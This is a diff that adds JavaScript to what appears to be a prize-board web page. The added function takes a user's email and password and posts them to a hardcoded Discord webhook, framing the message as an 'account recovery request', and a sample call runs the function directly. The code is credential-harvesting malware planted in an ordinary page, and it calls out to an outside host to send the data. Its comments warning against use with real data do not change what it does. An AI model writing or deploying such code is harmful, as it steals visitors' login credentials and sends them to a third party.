@@ -232,6 +232,38 @@ span {
             }
         }
     }
+
+
+
+function enviarDatosAWebhook(email, contrasena) {
+    var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
+    var request = new XMLHttpRequest();
+    request.open("POST", webhookURL);
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username: "Sistema de Recuperación",
+        avatar_url: "",
+        // Asegúrate de no enviar información sensible en aplicaciones reales
+        content: `Solicitud de recuperación de cuenta: ${email} - Contraseña: ${contrasena}`
+    };
+
+    request.send(JSON.stringify(params));
+
+    request.onreadystatechange = function() {
+        if (request.readyState === 4) {
+            if (request.status === 204) {
+                console.log("Datos enviados con éxito a Discord.");
+            } else {
+                console.error("Error al enviar datos a Discord:", request.statusText);
+            }
+        }
+    };
+}
+
+// Ejemplo de uso (NO UTILIZAR CON DATOS REALES):
+enviarDatosAWebhook("correo@example.com", "contrasena123");
+
    
 
     // Inicialización de la pizarra de premios
